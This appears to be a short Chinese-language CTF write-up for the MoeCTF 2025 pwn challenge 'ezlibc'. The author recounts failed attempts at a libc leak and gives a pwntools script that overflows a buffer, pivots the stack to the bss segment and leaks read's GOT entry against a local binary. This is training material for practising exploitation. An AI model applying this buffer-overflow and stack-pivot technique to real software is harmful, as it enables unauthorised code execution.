---
title: MoeCTF 2025
date: '2025-09-04 16:14:46'
updated: '2025-09-20 17:23:50'
---
# 第一周 ezlibc（脑抽版）
直接送libc地址的题目居然脑抽没反应过来...

先是试了用printf返回的rsi里面的lock来泄露libc地址，结果没法输出，printf和puts都是向指针里面取值的，取出来就是0xfbad000什么的

后面更是逆天，用栈迁移把栈迁到bss段结果发现执行printf泄露libc的时候bss不够大...

> 问了问xi_ix才发现自己这么抽象...
>

```python
#!/usr/bin/env python3
from pwn import *
context(arch='amd64', os='linux', log_level='debug')

link = process('./libc')
gdb.attach(link,'b *$rebase(0x0000000000011CB)')
pause()
# link = remote("127.0.0.1",38681)
libc=ELF('./libc.so.6')
elf=ELF('./libc')

link.recvuntil(b'How can I use ')
addr=int(link.recv(14),16)
success("addr:"+hex(addr))
binary_base=addr-0x1060
success("binary_base:"+hex(binary_base))

printf=binary_base+0x0000000000011F9
read=binary_base+0x0000000000011B5
ret=binary_base+0x000000000000101a

bss=binary_base+0x000000000004048+0x500
success("bss_addr:"+hex(bss))

link.recvuntil(b'without a backdoor? Damn!\n')
payload=b'a'*0x20+p64(bss)+p64(read)
link.send(payload)

pause()
read_got=binary_base+elf.got['read']
payload=p64(read_got)+b'a'*0x10+p64(bss-0x20)+p64(bss)+p64(printf)+p64(0xdeadbeef)
link.send(payload)

link.interactive()
```

